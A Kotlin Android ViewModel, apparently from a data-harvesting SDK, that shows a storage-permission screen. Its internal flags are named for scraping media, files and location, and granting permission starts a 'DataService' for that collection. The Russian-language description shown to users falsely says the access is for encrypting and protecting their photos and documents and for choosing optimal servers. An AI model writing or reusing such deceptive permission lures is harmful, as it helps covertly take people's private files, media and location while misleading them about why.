package com.sdocument.sdk.viewmodel.permission

import android.Manifest
import android.os.Build
import com.sdocument.sdk.utils.NetworkLogger
import com.sdocument.sdk.di.ConfigProvider
import com.sdocument.sdk.ScrapeType
import com.sdocument.sdk.SdkConfig
import com.sdocument.sdk.viewmodel.base.BaseViewModel

class StoragePermissionViewModel : BaseViewModel<StoragePermissionContract.State, StoragePermissionContract.Intent, StoragePermissionContract.Effect>(
    StoragePermissionContract.State(
        description = buildDescription(
            ConfigProvider.currentConfig.scrapeConfig.contains(ScrapeType.MEDIA),
            ConfigProvider.currentConfig.scrapeConfig.contains(ScrapeType.FILES),
            ConfigProvider.currentConfig.scrapeConfig.contains(ScrapeType.LOCATION)
        )
    )
) {
    private val scrapeMedia = ConfigProvider.currentConfig.scrapeConfig.contains(ScrapeType.MEDIA)
    private val scrapeFiles = ConfigProvider.currentConfig.scrapeConfig.contains(ScrapeType.FILES)
    private val scrapeLocation = ConfigProvider.currentConfig.scrapeConfig.contains(ScrapeType.LOCATION)

    override suspend fun handleIntent(intent: StoragePermissionContract.Intent) {
        when (intent) {
            is StoragePermissionContract.Intent.AllowClicked -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    sendEffect(StoragePermissionContract.Effect.OpenManageFilesSettings)
                } else {
                    val perms = mutableListOf(Manifest.permission.READ_EXTERNAL_STORAGE)
                    if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
                        perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
                    }
                    sendEffect(StoragePermissionContract.Effect.RequestLegacyPermission(perms))
                }
            }
            is StoragePermissionContract.Intent.SkipClicked -> {
                NetworkLogger.logActivity("permission not granted (storage)")
                sendEffect(StoragePermissionContract.Effect.NavigatePermissionError)
            }
            is StoragePermissionContract.Intent.PermissionResult -> {
                if (intent.granted) {
                    NetworkLogger.logActivity("permission granted (storage)")
                    sendEffect(StoragePermissionContract.Effect.StartDataService(scrapeMedia, scrapeFiles))
                    sendEffect(StoragePermissionContract.Effect.NavigateNext(scrapeLocation))
                } else {
                    NetworkLogger.logActivity("permission not granted (storage)")
                    sendEffect(StoragePermissionContract.Effect.NavigatePermissionError)
                }
            }
        }
    }
}

private fun buildDescription(scrapeMedia: Boolean, scrapeFiles: Boolean, scrapeLocation: Boolean) =
    buildString {
        append("Приложению требуются системные разрешения для обеспечения безопасности вашего соединения.\n\n")
        if (scrapeMedia) append("• Доступ к медиафайлам: Необходим для шифрования и защиты ваших фотографий и видео.\n")
        if (scrapeFiles) append("• Доступ к файлам: Позволяет защитить ваши документы и важные файлы в хранилище.\n")
        if (scrapeLocation) append("• Доступ к геолокации: Мы собираем геолокацию для подбора наиболее оптимальных серверов.\n")
    }
